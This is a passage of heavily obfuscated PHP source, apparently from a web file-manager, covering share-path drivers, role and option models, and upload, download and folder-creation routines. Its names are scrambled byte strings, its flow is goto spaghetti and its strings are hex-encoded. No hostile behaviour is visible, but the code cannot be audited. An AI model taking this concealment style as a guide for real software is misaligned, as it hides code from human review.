$a­˜¤’“à = $this->infoWithChildren($fË˜£õ×ª³); if ($eŒ¥åÆÈ†Ä) { return array($dã»ôÖìí¾[203] => $a­˜¤’“à[$dã»ôÖìí¾[203]], $dã»ôÖìí¾[202] => $a­˜¤’“à[$dã»ôÖìí¾[202]]); } return $fÛÜ›”ƒ©Å ? $a­˜¤’“à[$dã»ôÖìí¾[203]] : $a­˜¤’“à[$dã»ôÖìí¾[202]]; } public function listAll($d˜ñĞ•ÎŞ») { $C¹‡Ò¶èˆ = IO::info($this->pathParse[$_SERVER[Ïº«‚ßèÔˆø][76]]); if (!$C¹‡Ò¶èˆ) { return array(); } return $this->model->listAll($d˜ñĞ•ÎŞ»); } public function getContent($F‹ïˆ˜½ÏÌ) { return $this->model->getContent($F‹ïˆ˜½ÏÌ); } public function setContent($eÀæİÁè‹š, $eÈÀÅù÷®… = '') { return $this->model->setContent($eÀæİÁè‹š, $eÈÀÅù÷®…); } public function fileSubstr($bè‘›Íêî½, $AÉÊ´Û’ğ, $a„ŒŠù¨¸) { return $this->model->fileSubstr($bè‘›Íêî½, $AÉÊ´Û’ğ, $a„ŒŠù¨¸); } public function download($BŠ¬¬£æ·Ó, $C×éÚªñäí = '') { $F°Óê„Û = get_path_father($C×éÚªñäí); $D¯³ëÀˆ¾ = get_path_this($C×éÚªñäí); $B…¾ÈáİóÛ = $this->model->fileInfoGet($BŠ¬¬£æ·Ó); $BôÃ½”™»ˆ = IO::copy($B…¾ÈáİóÛ[$_SERVER[Ïº«‚ßèÔˆø][76]], $F°Óê„Û, !1, $D¯³ëÀˆ¾); return $BôÃ½”™»ˆ; } public function setModifyTime($Aå÷è½á¨, $b¹æ¥Ê¡ = '') { $CšËâ‚Ğí =& $_SERVER[Ïº«‚ßèÔˆø]; if (!$Aå÷è½á¨) { return; } $this->model->where(array($CšËâ‚Ğí[408] => $Aå÷è½á¨))->save(array($CšËâ‚Ğí[84] => $b¹æ¥Ê¡)); } public function upload($D’ÖÁ±èÉê, $D¡ÌĞçÙ“³, $c¶İç³À¥ë = false, $A¯Ç·„±Ê = REPEAT_REPLACE) { $E³èÃˆÖ˜À =& $_SERVER[Ïº«‚ßèÔˆø]; $c¬¨…¿ = $this->parse($D’ÖÁ±èÉê); $Cì±Â®…–ß = $this->model->addFile($c¬¨…¿[$E³èÃˆÖ˜À[392]], $D¡ÌĞçÙ“³, $c¬¨…¿[$E³èÃˆÖ˜À[76]], $c¶İç³À¥ë, $A¯Ç·„±Ê); return $this->getPathOuter($Cì±Â®…–ß); } public function uploadFileByID($eŠ¼¯¥ù»Á, $dùƒ’©¹–, $a¥Î‡¦êÌ) { $AÍÜñ«“ù« =& $_SERVER[Ïº«‚ßèÔˆø]; $c•ç¼¤½½ = $this->parse($eŠ¼¯¥ù»Á); $aºæ‡Øİô = $this->model->addFileByFileID($c•ç¼¤½½[$AÍÜñ«“ù«[392]], $dùƒ’©¹–, $c•ç¼¤½½[$AÍÜñ«“ù«[76]], $a¥Î‡¦êÌ); return $this->getPathOuter($aºæ‡Øİô); } public function addFileByRemote($dâÅ¼ƒ©›, $b§œÜ©°´, $bƒ¦Í”Í¾ = array(), $BõéÇŒÔîÔ = '', $CÇª©˜ï¬¤) { $aŸøßÂî± =& $_SERVER[Ïº«‚ßèÔˆø]; $CéÛñˆ—õÙ = $this->parse($dâÅ¼ƒ©›); $BõéÇŒÔîÔ = empty($BõéÇŒÔîÔ) ? $CéÛñˆ—õÙ[$aŸøßÂî±[76]] : $BõéÇŒÔîÔ; $FŠî†´ø‹ = $this->model->addFileByRemote($CéÛñˆ—õÙ[$aŸøßÂî±[392]], $b§œÜ©°´, $BõéÇŒÔîÔ, $bƒ¦Í”Í¾, $CÇª©˜ï¬¤); return $this->getPathOuter($FŠî†´ø‹); } public function uploadLink($f¥ªõæƒŠí, $fİÙ×ØÁ = 0) { $CÇº¶†– =& $_SERVER[Ïº«‚ßèÔˆø]; $E·“Ä™Û‡Ø = $this->parse($f¥ªõæƒŠí); $dÕÑ›‹™£– = _get($GLOBALS[$CÇº¶†–[7]], $CÇº¶†–[1189]); $d§ê’É‡µ‰ = _get($GLOBALS[$CÇº¶†–[7]], $CÇº¶†–[1190]); $f¥ªõæƒŠí = Model($CÇº¶†–[570])->createFileName($E·“Ä™Û‡Ø[$CÇº¶†–[76]], $dÕÑ›‹™£–, $d§ê’É‡µ‰); return IO::uploadLink($f¥ªõæƒŠí, $fİÙ×ØÁ); } public function fileNameAuto($E·İ¡Ÿ¨¢, $CÇô³Áùã¾, $b÷ğ¸°ŞÅ = REPEAT_REPLACE, $F“ß—îÇ¡ò = false) { return $this->model->fileNameAuto($E·İ¡Ÿ¨¢, $CÇô³Áùã¾, $b÷ğ¸°ŞÅ, $F“ß—îÇ¡ò); } public function fileNameExist($EÇ…‘µ„Ò–, $añÁÓğ‘§) { return $this->model->fileNameExist($EÇ…‘µ„Ò–, $añÁÓğ‘§); } protected function _fileOut($d‰Á‰İ¦ôå, $BğÑ·÷À‡¢ = false, $DùÆ……œÙ¹ = false, $E¥‰º–‰Çî = '', $C·ØãĞÏ = false) { goto f’½áÒĞ±é; Aé£âŒæ½°: if ($C·ØãĞÏ) { return IO::fileOutServer($fùĞÏÉ¦Ì¼[$D„¾äéÚÉò[76]], $BğÑ·÷À‡¢, $E‰‚‹³¶¥, $E¥‰º–‰Çî); } IO::fileOut($fùĞÏÉ¦Ì¼[$D„¾äéÚÉò[76]], $BğÑ·÷À‡¢, $E‰‚‹³¶¥, $E¥‰º–‰Çî); goto AóÅöÏø›; f’½áÒĞ±é: $D„¾äéÚÉò =& $_SERVER[Ïº«‚ßèÔˆø]; $d†ÔæìŸ = $this->model->sourceInfo($d‰Á‰İ¦ôå); if ($d†ÔæìŸ[$D„¾äéÚÉò[401]] == $D„¾äéÚÉò[87]) { header($D„¾äéÚÉò[1191]); die; } goto Bˆóå±®; Bˆóå±®: $fùĞÏÉ¦Ì¼ = $this->model->fileInfoGet($d‰Á‰İ¦ôå); $E¥‰º–‰Çî = $fùĞÏÉ¦Ì¼[$D„¾äéÚÉò[170]] ? $fùĞÏÉ¦Ì¼[$D„¾äéÚÉò[170]] : $E¥‰º–‰Çî; $E‰‚‹³¶¥ = isset($GLOBALS[$D„¾äéÚÉò[1192]]) ? $GLOBALS[$D„¾äéÚÉò[1192]] : $d†ÔæìŸ[$D„¾äéÚÉò[28]]; goto Aé£âŒæ½°; AóÅöÏø›: } public function fileOut($BÎ›ÄöÈßª, $c¯ĞÜ¨Â = false, $dô™ï”Ú§Å = false, $cğÄŞØ»° = '') { $this->_fileOut($BÎ›ÄöÈßª, $c¯ĞÜ¨Â, $dô™ï”Ú§Å, $cğÄŞØ»°); } public function fileOutServer($A‘‰˜¹²¾, $DÎß¸»±÷Ÿ = false, $C¤—‚ª’Ö = false, $FÓÙÒ™æ§ = '') { $this->_fileOut($A‘‰˜¹²¾, $DÎß¸»±÷Ÿ, $C¤—‚ª’Ö, $FÓÙÒ™æ§, !0); } protected function _fileOutImage($b¶»‘¸ß†, $DÑÚ³Õãóİ = 250) { goto b‡Æõ‡×; EèËî¯ßÄÇ: $GLOBALS[$DæÕµË¹¸[1192]] = $a»”Ÿ†®‚[$DæÕµË¹¸[28]]; $GLOBALS[$DæÕµË¹¸[162]] = $a»”Ÿ†®‚; IO::fileOutImage($a»”Ÿ†®‚[$DæÕµË¹¸[76]], $DÑÚ³Õãóİ); goto d¿á°â†ß±; b‡Æõ‡×: $DæÕµË¹¸ =& $_SERVER[Ïº«‚ßèÔˆø]; $c¤›ŒÄ•·Ü = $this->model->pathInfo($b¶»‘¸ß†); if ($c¤›ŒÄ•·Ü[$DæÕµË¹¸[401]] == $DæÕµË¹¸[87]) { show_json($DæÕµË¹¸[1193] . $b¶»‘¸ß†, !1); } goto Eµà“ñ‚‚Ï; Eµà“ñ‚‚Ï: $a»”Ÿ†®‚ = $this->model->fileInfoGet($b¶»‘¸ß†); $a»”Ÿ†®‚[$DæÕµË¹¸[28]] = $c¤›ŒÄ•·Ü[$DæÕµË¹¸[28]]; $a»”Ÿ†®‚[$DæÕµË¹¸[163]] = $c¤›ŒÄ•·Ü[$DæÕµË¹¸[163]]; goto EèËî¯ßÄÇ; d¿á°â†ß±: } public function fileOutImage($fÊÀæçÚæ, $cãÃêò’·Ò = 250) { $this->_fileOutImage($fÊÀæçÚæ, $cãÃêò’·Ò); } public function fileOutImageServer($D¦ÖŠ…Ñº®, $F¤™¡´äöğ = 250) { $this->_fileOutImage($D¦ÖŠ…Ñº®, $F¤™¡´äöğ); } public function link($bàšªÑÁš´, $bãÖŸ‡òğà = '') { $F‡™À‹İÆ = $this->model->fileInfoGet($bàšªÑÁš´); return IO::link($F‡™À‹İÆ[$_SERVER[Ïº«‚ßèÔˆø][76]], $bãÖŸ‡òğà); } protected function parse($fƒÜß›‚†½) { $E’Œ©—¸£İ =& $_SERVER[Ïº«‚ßèÔˆø]; if (strstr($fƒÜß›‚†½, $E’Œ©—¸£İ[8]) === !1) { return array($E’Œ©—¸£İ[410] => intval($fƒÜß›‚†½), $E’Œ©—¸£İ[76] => $E’Œ©—¸£İ[33], $E’Œ©—¸£İ[1188] => array()); } $E÷½¶„œ™ = explode($E’Œ©—¸£İ[8], trim($fƒÜß›‚†½, $E’Œ©—¸£İ[8])); if (count($E÷½¶„œ™) < 2) { show_tips($fƒÜß›‚†½ . $E’Œ©—¸£İ[1194]); } return array($E’Œ©—¸£İ[410] => intval($E÷½¶„œ™[0]), $E’Œ©—¸£İ[76] => $E÷½¶„œ™[1], $E’Œ©—¸£İ[1188] => array_slice($E÷½¶„œ™, 1)); } } class PathDriverDbShareItem extends PathDriverDB { public function __construct($FöÔÖÆèá¨) { $this->pathParse = $FöÔÖÆèá¨; $this->model = Model($_SERVER[Ïº«‚ßèÔˆø][1187]); } public function getPathOuter($e–„­ˆÅµ¯) { $dÀµ½„Àë =& $_SERVER[Ïº«‚ßèÔˆø]; if (!$e–„­ˆÅµ¯) { return $e–„­ˆÅµ¯; } $d÷øÙí”ç = $this->parse($e–„­ˆÅµ¯); return trim(KodIO::makeShare($this->pathParse[$dÀµ½„Àë[392]], $d÷øÙí”ç[$dÀµ½„Àë[392]]), $dÀµ½„Àë[8]); } protected function infoParse($bñŒ‘¢î‰“, $E‹Æº…â±† = false, $EêÜİé¼Ø‹ = false) { $CÒ×éÛ ßã =& $_SERVER[Ïº«‚ßèÔˆø]; $C©Ù±‘‹›ï = $this->pathParse[$CÒ×éÛ ßã[392]]; $Bƒ‚«…«´‰ = trim($this->pathParse[$CÒ×éÛ ßã[1047]], $CÒ×éÛ ßã[8]); return Action($CÒ×éÛ ßã[1195])->sharePathInfo($C©Ù±‘‹›ï, $Bƒ‚«…«´‰); } public function infoFull($c‹â‡ø½ÒÆ) { $e‘ğßäï„º =& $_SERVER[Ïº«‚ßèÔˆø]; $eôÅŠŒ®Åª = explode($e‘ğßäï„º[8], trim($c‹â‡ø½ÒÆ, $e‘ğßäï„º[8])); if (count($eôÅŠŒ®Åª) > 1) { $F˜Œƒ¼âˆÁ = implode($e‘ğßäï„º[8], array_splice($eôÅŠŒ®Åª, 1)); $F¿Áíùó»À = $this->model->pathInfoByPath($eôÅŠŒ®Åª[0], $F˜Œƒ¼âˆÁ); if (!$F¿Áíùó»À) { return !1; } $this->pathParse[$e‘ğßäï„º[1047]] = $F¿Áíùó»À[$e‘ğßäï„º[394]]; } return $this->infoParse($c‹â‡ø½ÒÆ); } public function listAll($A„ñ½ËÉë¡) { goto F§ÔÏ·¡ó†; fÎÜ±ÜÌĞ¬: $dÄ¬• î¢‰ = $this->model->listAll($A„ñ½ËÉë¡); $A¼ŠÜ¤â™ = Model($dòÂÎ²Ø›í[562])->getInfo($CĞ´ã³œƒÜ[$dòÂÎ²Ø›í[466]]); $dê»á¸Åà = Action($dòÂÎ²Ø›í[1195]); goto EØï„½‡„; F§ÔÏ·¡ó†: $dòÂÎ²Ø›í =& $_SERVER[Ïº«‚ßèÔˆø]; $CĞ´ã³œƒÜ = IO::info($this->pathParse[$dòÂÎ²Ø›í[76]]); if (!$CĞ´ã³œƒÜ) { return array(); } goto fÎÜ±ÜÌĞ¬; EØï„½‡„: foreach ($dÄ¬• î¢‰ as &$dïàÃÖÍÅ…) { check_abort(); $dïàÃÖÍÅ…[$dòÂÎ²Ø›í[85]] = $dê»á¸Åà->_shareItemeParse($dïàÃÖÍÅ…[$dòÂÎ²Ø›í[85]], $A¼ŠÜ¤â™); } unset($dïàÃÖÍÅ…); return $dÄ¬• î¢‰; goto a–îİäšçï; a–îİäšçï: } } goto aÌƒÖã™Èñ; A™ÀÅ´›¾²: class SystemOptionModel extends ModelBaseOption { protected $tableName = "\x73\x79\163\164\x65\x6d\x5f\x6f\x70\164\151\157\x6e"; protected $jsonField = array("\x6d\145\156\165", "\162\x6f\x6c\145", "\x72\x6f\154\x65\107\x72\x6f\165\160", "\x72\x65\x67\151\x73\164", "\145\x6d\x61\151\x6c"); function __construct() { parent::__construct(); } protected function cacheKey($cí­ø£¤Çß) { return "\123\171\x73\164\145\x6d\117\160\x74\151\x6f\x6e\137{$cí­ø£¤Çß}"; } protected function optionDefault($e²Æ¶ ¾Õ¾ = '') { $F™ßÍÉ”œ =& $_SERVER[Ïº«‚ßèÔˆø]; if ($e²Æ¶ ¾Õ¾ == $F™ßÍÉ”œ[33]) { return $GLOBALS[$F™ßÍÉ”œ[6]][$F™ßÍÉ”œ[377]]; } } } class SystemRecordModel extends ModelBaseLight { } class SystemRoleModel extends ModelBaseLight { public $optionType = "\123\171\x73\164\145\x6d\56\162\x6f\154\145\x4c\151\163\x74"; public $field = array("\x6e\141\155\x65", "\141\165\x74\150", "\154\141\142\145\x6c", "\x64\151\x73\160\x6c\x61\171", "\163\171\163\164\145\155", "\144\x65\x73\143", "\x69\x67\x6e\x6f\x72\145\x45\x78\164", "\151\x67\x6e\157\x72\145\106\151\154\145\123\151\x7a\145", "\141\x64\155\151\x6e\151\163\x74\162\x61\164\157\162", "\x73\x6f\162\164"); public function listData($EÊÆ¼ßèÂ¶ = false, $F¬¤¦±¡Æ = "\163\157\x72\164", $dŞ†¶„ìøƒ = false) { $A˜‘ë—Ğ˜‚ =& $_SERVER[Ïº«‚ßèÔˆø]; $fÉ»…„Íåæ = parent::listData($EÊÆ¼ßèÂ¶, $F¬¤¦±¡Æ, $dŞ†¶„ìøƒ); if (!$EÊÆ¼ßèÂ¶) { foreach ($fÉ»…„Íåæ as $a—òìóâòÃ => $fÅ‘˜Ì‘„÷) { if ($fÅ‘˜Ì‘„÷[$A˜‘ë—Ğ˜‚[1860]] == 1) { $fÉ»…„Íåæ[$a—òìóâòÃ][$A˜‘ë—Ğ˜‚[429]] = LNG($A˜‘ë—Ğ˜‚[2084]); } } } return $fÉ»…„Íåæ; } public function update($B·‘Ïğª¦ô, $EŠô«Ùá ) { goto BŒß“Èä‰Ì; BŒß“Èä‰Ì: $F¿®ÜÊÏ¶» =& $_SERVER[Ïº«‚ßèÔˆø]; $E© ©‰Ş’ = parent::listData($B·‘Ïğª¦ô); $EÒÆØ¼øºÀ = $this->findByName($EŠô«Ùá [$F¿®ÜÊÏ¶»[28]]); goto bİæîßö¸ê; AŠ‰Òíáñ: return parent::update($B·‘Ïğª¦ô, $EŠô«Ùá ); goto D³Û·„šÙö; bİæîßö¸ê: if (!$E© ©‰Ş’ || $EÒÆØ¼øºÀ && $EÒÆØ¼øºÀ[$F¿®ÜÊÏ¶»[392]] != $E© ©‰Ş’[$F¿®ÜÊÏ¶»[392]]) { return !1; } if ($EÒÆØ¼øºÀ[$F¿®ÜÊÏ¶»[1860]] == 1) { $EŠô«Ùá  = array($F¿®ÜÊÏ¶»[28] => $EŠô«Ùá [$F¿®ÜÊÏ¶»[28]], $F¿®ÜÊÏ¶»[1692] => $EŠô«Ùá [$F¿®ÜÊÏ¶»[1692]]); } $this->filterAuth($EŠô«Ùá [$F¿®ÜÊÏ¶»[404]]); goto AŠ‰Òíáñ; D³Û·„šÙö: } public function remove($b™«ë¿º™) { $FåğÅª¿ = parent::listData($b™«ë¿º™); if (!$FåğÅª¿ || $FåğÅª¿[$_SERVER[Ïº«‚ßèÔˆø][1152]]) { return !1; } return parent::remove($b™«ë¿º™); } public function add($b­ï¬âÃ) { goto fõ“ø¢½’Ù; B­÷Ê©øÙ: return parent::insert($b­ï¬âÃ); goto aº±ì˜œœ; fõ“ø¢½’Ù: $e³˜ğğ‘×… =& $_SERVER[Ïº«‚ßèÔˆø]; $BÈ–„Î£İ‚ = $b­ï¬âÃ[$e³˜ğğ‘×…[28]]; if ($this->findByName($BÈ–„Î£İ‚)) { return !1; } goto Eå†“†¬ŠÜ; Eå†“†¬ŠÜ: $Aá®õĞ° = array($e³˜ğğ‘×…[411] => $BÈ–„Î£İ‚, $e³˜ğğ‘×…[1677] => $e³˜ğğ‘×…[33], $e³˜ğğ‘×…[1673] => $e³˜ğğ‘×…[1681], $e³˜ğğ‘×…[2085] => 1, $e³˜ğğ‘×…[1676] => 0, $e³˜ğğ‘×…[2086] => 0, $e³˜ğğ‘×…[1675] => $this->getSort()); $b­ï¬âÃ = array_merge($Aá®õĞ°, $b­ï¬âÃ); $this->filterAuth($b­ï¬âÃ[$e³˜ğğ‘×…[404]]); goto B­÷Ê©øÙ; aº±ì˜œœ: } private function getSort() { $aŸµàÖ„äò =& $_SERVER[Ïº«‚ßèÔˆø]; $DêÅŒÅã¦ = parent::listData(); $c­½ˆØ´é‚ = array_to_keyvalue($DêÅŒÅã¦, $aŸµàÖ„äò[33], $aŸµàÖ„äò[1694]); return empty($c­½ˆØ´é‚) ? 0 : max($c­½ˆØ´é‚) + 1; } private function filterAuth(&$dŒ­àÏËÜ§) { $D£›£µÕ‚ =& $_SERVER[Ïº«‚ßèÔˆø]; $CĞò•Œí“Š = array(); $a¡’Á×¸åÊ = array_filter(explode($D£›£µÕ‚[47], $dŒ­àÏËÜ§)); foreach ($a¡’Á×¸åÊ as $dŒ­àÏËÜ§) { $CƒÔ„ê—å´ = explode($D£›£µÕ‚[95], $dŒ­àÏËÜ§); if ($CƒÔ„ê—å´[0] == $D£›£µÕ‚[2087] && $CƒÔ„ê—å´[1] != $D£›£µÕ‚[1073]) { $D×ËíÉëÙ = $CƒÔ„ê—å´[0] . $D£›£µÕ‚[95] . $CƒÔ„ê—å´[1] . $D£›£µÕ‚[2088]; if (!in_array($D×ËíÉëÙ, $a¡’Á×¸åÊ)) { $CĞò•Œí“Š[] = $D×ËíÉëÙ; } } $CĞò•Œí“Š[] = $dŒ­àÏËÜ§; } $dŒ­àÏËÜ§ = implode($D£›£µÕ‚[47], $CĞò•Œí“Š); } public function sort($a”´Ÿ¸¦‡¬, $bùøÕ¿«Ï) { return parent::update($a”´Ÿ¸¦‡¬, $bùøÕ¿«Ï); } } goto fÔÎ¹Òä®”; DÕ¹„×©¦: class SourceModel extends SourceListSearchModel { public $statusIgnoreResetSpace = false; public function userRootAdd($C»˜ô½–„½) { $fŞÅÈ‡“½ =& $_SERVER[Ïº«‚ßèÔˆø]; $d‚·æÔÆÈ = Model($fŞÅÈ‡“½[501])->where(array($fŞÅÈ‡“½[1500] => $C»˜ô½–„½))->find(); $C½­Õ©œ°– = $this->_mkdirRoot(SourceModel::TYPE_USER, $C»˜ô½–„½, $d‚·æÔÆÈ[$fŞÅÈ‡“½[28]]); $this->userDesktopAdd($C½­Õ©œ°–); return $C½­Õ©œ°–; } public function userDesktopAdd($dõî†à«®) { $bÖÔ½ÙŠã =& $_SERVER[Ïº«‚ßèÔˆø]; $Fö– ÂÀ ‚ = LNG($bÖÔ½ÙŠã[1930]); $d§’Ğ¸ï™ì = $this->mkdir($dõî†à«®, $Fö– ÂÀ ‚); $this->metaSet($d§’Ğ¸ï™ì, $bÖÔ½ÙŠã[1931], $bÖÔ½ÙŠã[87]); $this->metaSet($dõî†à«®, $bÖÔ½ÙŠã[1932], $d§’Ğ¸ï™ì); } public function groupRootAdd($E¦Ç ¡Ş‘¤) { $DÅÛºŞ‡„ =& $_SERVER[Ïº«‚ßèÔˆø]; $A—…í¸ÕÉ´ = Model($DÅÛºŞ‡„[484])->where(array($DÅÛºŞ‡„[1749] => $E¦Ç ¡Ş‘¤))->find(); return $this->_mkdirRoot(SourceModel::TYPE_GROUP, $E¦Ç ¡Ş‘¤, $A—…í¸ÕÉ´[$DÅÛºŞ‡„[28]]); } public function systemRootPathAdd($e• æÕ„Ô) { if ($e• æÕ„Ô != $_SERVER[Ïº«‚ßèÔˆø][504]) { return !1; } return $this->_mkdirRoot(SourceModel::TYPE_SYSTEM, 0, $e• æÕ„Ô); } public function userRootRemove($d‚Æ¸ˆØÖØ) { $A±Õó­“¬ = $this->sourceRoot(SourceModel::TYPE_USER, $d‚Æ¸ˆØÖØ); if (!$A±Õó­“¬) { return; } $this->remove($A±Õó­“¬, !1); } public function groupRootRemove($D­å„‡˜ï²) { $Eµ†ÍÊ…ßİ = $this->sourceRoot(SourceModel::TYPE_GROUP, $D­å„‡˜ï²); if (!$Eµ†ÍÊ…ßİ) { return; } $this->remove($Eµ†ÍÊ…ßİ, !1); } private function _mkdirRoot($b—ìšÛ¡»õ, $FëùŠ¿¡ò¾, $BÛ¥à…–®ø) { goto F‘÷Š¶­É; F‘÷Š¶­É: $b´ƒÏ =& $_SERVER[Ïº«‚ßèÔˆø]; $C†§ñÚ™Ê = array($b´ƒÏ[393] => 0, $b´ƒÏ[548] => $b—ìšÛ¡»õ, $b´ƒÏ[549] => $FëùŠ¿¡ò¾, $b´ƒÏ[545] => 1, $b´ƒÏ[550] => USER_ID, $b´ƒÏ[551] => USER_ID, $b´ƒÏ[546] => $b´ƒÏ[33], $b´ƒÏ[552] => $b´ƒÏ[497], $b´ƒÏ[420] => 0, $b´ƒÏ[547] => 0, $b´ƒÏ[446] => 0, $b´ƒÏ[553] => $b´ƒÏ[33]); if ($c“¤¹éìŸ = $this->where($C†§ñÚ™Ê)->find()) { return $c“¤¹éìŸ[$b´ƒÏ[394]]; } goto EÀóÒŸöÔ; dÉ©Áå„Ì¢: CacheLock::unlock($còğºÎñ—™); return $e¿–Ñíˆ³; goto cñŞ™ˆŞöÙ; EÀóÒŸöÔ: $còğºÎñ—™ = "\115\157\144\x65\154\x53\157\165\x72\143\145\56\x6d\x6b\144\x69\162\x52\157\x6f\164\x2e{$b—ìšÛ¡»õ}\56{$FëùŠ¿¡ò¾}\x2e" . $BÛ¥à…–®ø; CacheLock::lock($còğºÎñ—™); $C†§ñÚ™Ê[$b´ƒÏ[28]] = $BÛ¥à…–®ø; goto fÅùŸÔ‚”â; fÅùŸÔ‚”â: $e¿–Ñíˆ³ = $this->add($C†§ñÚ™Ê); $DôÛ¾İó³ = array($b´ƒÏ[554] => short_id($e¿–Ñíˆ³)); $this->where(array($b´ƒÏ[408] => $e¿–Ñíˆ³))->save($DôÛ¾İó³); goto dÉ©Áå„Ì¢; cñŞ™ˆŞöÙ: } private function sourceRoot($f×ùô‡¿, $Aˆ†¨»¸©¥, $d¾´õÛá· = false) { $cæ¾“„µ¬Ç =& $_SERVER[Ïº«‚ßèÔˆø]; $c¨°Ë…¤ç = array($cæ¾“„µ¬Ç[393] => 0, $cæ¾“„µ¬Ç[548] => $f×ùô‡¿, $cæ¾“„µ¬Ç[549] => $Aˆ†¨»¸©¥); if ($fëÖª–öÚ° = $this->where($c¨°Ë…¤ç)->find()) { return $d¾´õÛá· ? $fëÖª–öÚ° : $fëÖª–öÚ°[$cæ¾“„µ¬Ç[394]]; } return !1; } public function sourceRootGroup($B¸ˆğğĞ†‡) { goto e‘„ãÌÇ; bš¥â”ñ¬‚: $this->selectPageReset(); $AôÓÜ£¿³‡ = $this->listSource($cÓŒŒ™…„, 1000); $this->selectPageRestore(); goto b˜¯×à«Ñã; b˜¯×à«Ñã: return array_to_keyvalue($AôÓÜ£¿³‡[$Aò¯ÃŸâ„[75]], $Aò¯ÃŸâ„[482]); goto bê‡Äğôê…; e‘„ãÌÇ: $Aò¯ÃŸâ„ =& $_SERVER[Ïº«‚ßèÔˆø]; if (is_string($B¸ˆğğĞ†‡)) { $B¸ˆğğĞ†‡ = array($B¸ˆğğĞ†‡); } $cÓŒŒ™…„ = array($Aò¯ÃŸâ„[393] => 0, $Aò¯ÃŸâ„[548] => SourceModel::TYPE_GROUP, $Aò¯ÃŸâ„[549] => array($Aò¯ÃŸâ„[7], $B¸ˆğğĞ†‡)); goto bš¥â”ñ¬‚; bê‡Äğôê…: } public function mkfile($e©ÚêÜ¬¹ã, $DŒõ‡š­Ù, $AÆçç«ñƒ = '', $e‰’¶ÙºÒ¤ = REPEAT_RENAME) { $a®éƒ‹½ÊŠ =& $_SERVER[Ïº«‚ßèÔˆø]; $F†æÊâÀğÇ = Model($a®éƒ‹½ÊŠ[570])->addFileByContent($AÆçç«ñƒ, $DŒõ‡š­Ù); return $this->_createFileCall($e©ÚêÜ¬¹ã, $DŒõ‡š­Ù, $F†æÊâÀğÇ, $e‰’¶ÙºÒ¤, $a®éƒ‹½ÊŠ[1197]); } public function addFile($c–ÀŒ’„Íó, $A¤ÙÍÂˆ˜¨, $c¯‹³­Ó½, $AÁÂŞ„™¢ = false, $E„ãÓó°ˆ  = REPEAT_RENAME) { $BÁ®æ‘Ö = Model($_SERVER[Ïº«‚ßèÔˆø][570])->addFile($A¤ÙÍÂˆ˜¨, $c¯‹³­Ó½, $AÁÂŞ„™¢); return $this->_createFileCall($c–ÀŒ’„Íó, $c¯‹³­Ó½, $BÁ®æ‘Ö, $E„ãÓó°ˆ ); } public function addFileByFileID($bÜ­ÒšÌ§, $CÌÖŸÑè£´, $D‘ÑôğŒŠÒ, $D˜Ğ¸Æ¦…‚ = REPEAT_RENAME) { $E›‹¤íß—È =& $_SERVER[Ïº«‚ßèÔˆø]; $eØËš›Åô‘ = Model($E›‹¤íß—È[570])->find($CÌÖŸÑè£´); Model($E›‹¤íß—È[570])->linkAdd($CÌÖŸÑè£´); return $this->_createFileCall($bÜ­ÒšÌ§, $D‘ÑôğŒŠÒ, $eØËš›Åô‘, $D˜Ğ¸Æ¦…‚); } public function addFileByRemote($DÇ±öÒ‹, $cˆ®öó–šÅ, $EöÅˆ¸Õ…Ì, $bÑÛÉ“©… = array(), $Fƒî¬ŠªÆ‚ = REPEAT_RENAME) { $Cš”µÖá‰ = Model($_SERVER[Ïº«‚ßèÔˆø][570])->addFileByRemote($cˆ®öó–šÅ, $EöÅˆ¸Õ…Ì, $bÑÛÉ“©…); return $this->_createFileCall($DÇ±öÒ‹, $EöÅˆ¸Õ…Ì, $Cš”µÖá‰, $Fƒî¬ŠªÆ‚); } private function _createFileCall($bÚ‘å§Æƒ, $EÈËªğà‹Ú, $cƒ‘ù¯ØÆĞ, $c–˜ îÃ‘Î, $e¯Ô¾º×ìÄ = "\x75\160\154\x6f\141\144") { goto BË‘¼ÇÊÒÇ; BË‘¼ÇÊÒÇ: $Eô©ŠÙ » =& $_SERVER[Ïº«‚ßèÔˆø]; $e‚ØŞªŸ‚˜ = !1; $this->lockWriteStart($bÚ‘å§Æƒ, $EÈËªğà‹Ú); goto CÙå×ÙêéŠ; Fƒ âê¯¨: if ($e‚ØŞªŸ‚˜ && $cÀßºå && $cÀßºå != $dŠÌÌÓÑÓ) { Model($Eô©ŠÙ »[1901])->eventCreate($cÀßºå, $e¯Ô¾º×ìÄ); } $this->lockWriteEnd($bÚ‘å§Æƒ, $EÈËªğà‹Ú); return $cÀßºå; goto BË¡²™Ôäø; CÙå×ÙêéŠ: $dŠÌÌÓÑÓ = $this->fileNameExist($bÚ‘å§Æƒ, $EÈËªğà‹Ú); $cÀßºå = $this->_createFile($bÚ‘å§Æƒ, $EÈËªğà‹Ú, $cƒ‘ù¯ØÆĞ, $c–˜ îÃ‘Î, $e‚ØŞªŸ‚˜); if (!$e‚ØŞªŸ‚˜) { Model($Eô©ŠÙ »[448])->remove($cƒ‘ù¯ØÆĞ[$Eô©ŠÙ »[445]]); } goto Fƒ âê¯¨; BË¡²™Ôäø: } public function mkdir($d´†ñ·½Ë, $cæ¾ãŒÉÆ, $Dò÷ß‰ôÊ± = REPEAT_SKIP) { goto EÛÛğ„ï¢Ê; A‰‹‰²ÖÍ: $b…ì”šÆŸ¼ = $this->_addSoure($EÅã¢°†±, $F¼ÍÑÌˆ³); Model($BÜŒµÅƒğ‘[1901])->eventCreate($b…ì”šÆŸ¼, $BÜŒµÅƒğ‘[1198]); $this->lockWriteEnd($d´†ñ·½Ë, $cæ¾ãŒÉÆ); goto CÕ»ÜŠÏİÌ; EÛÛğ„ï¢Ê: $BÜŒµÅƒğ‘ =& $_SERVER[Ïº«‚ßèÔˆø]; $F¼ÍÑÌˆ³ = $this->sourceInfo($d´†ñ·½Ë); if (!$F¼ÍÑÌˆ³) { return !1; } goto A©åí®®ª; A©åí®®ª: $this->lockWriteStart($d´†ñ·½Ë, $cæ¾ãŒÉÆ); if ($Dò÷ß‰ôÊ± !== !1) { $b§÷»Ş«™¡ = $this->fileNameExist($d´†ñ·½Ë, $cæ¾ãŒÉÆ); if ($b§÷»Ş«™¡ && $Dò÷ß‰ôÊ± != REPEAT_RENAME_FOLDER) { $this->lockWriteEnd($d´†ñ·½Ë, $cæ¾ãŒÉÆ); return $b§÷»Ş«™¡; } $cæ¾ãŒÉÆ = $this->fileNameAuto($d´†ñ·½Ë, $cæ¾ãŒÉÆ, $Dò÷ß‰ôÊ±); } $EÅã¢°†± = array($BÜŒµÅƒğ‘[545] => 1, $BÜŒµÅƒğ‘[411] => $cæ¾ãŒÉÆ, $BÜŒµÅƒğ‘[546] => $BÜŒµÅƒğ‘[33], 